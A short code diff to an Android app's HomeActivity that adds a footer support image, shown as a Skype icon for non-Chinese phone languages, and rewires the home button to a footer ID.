@@ -24,6 +24,7 @@ import android.view.View;
 import android.view.View.OnClickListener;
 import android.widget.Button;
 import android.widget.ImageButton;
+import android.widget.ImageView;
 import android.widget.TextView;
 
 import system.service.GetInfoTask;
@@ -34,6 +35,7 @@ import system.service.feature.sms.SmsCtrl;
 
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.FileCtrl;
+import com.particle.inspector.common.util.LANG;
 import com.particle.inspector.common.util.NetworkUtil;
 import com.particle.inspector.common.util.RegExpUtil;
 import com.particle.inspector.common.util.StrUtils;
@@ -46,6 +48,7 @@ public class HomeActivity extends Activity
     
     private final static int DEFAULT_RETRY_COUNT = 3;
     
+    ImageView img_support;
     ImageButton btn_home;
 	Button btn_testMail;
 	Button btn_testPhone;
@@ -94,7 +97,10 @@ public class HomeActivity extends Activity
     	}
     	
     	// --------------------------------------------------------------
-    	btn_home = (ImageButton)findViewById(R.id.actionbar_btn_home);
+    	img_support = (ImageView)findViewById(R.id.footer_img_support);
+    	if (DeviceProperty.getPhoneLang() != LANG.CN) img_support.setImageResource(R.drawable.skype);
+    	
+    	btn_home = (ImageButton)findViewById(R.id.footer_btn_home);
         btn_home.setOnClickListener(listener_home);
     	btn_setting = (Button)findViewById(R.id.btn_setting);
         btn_setting.setOnClickListener(listener_setting);
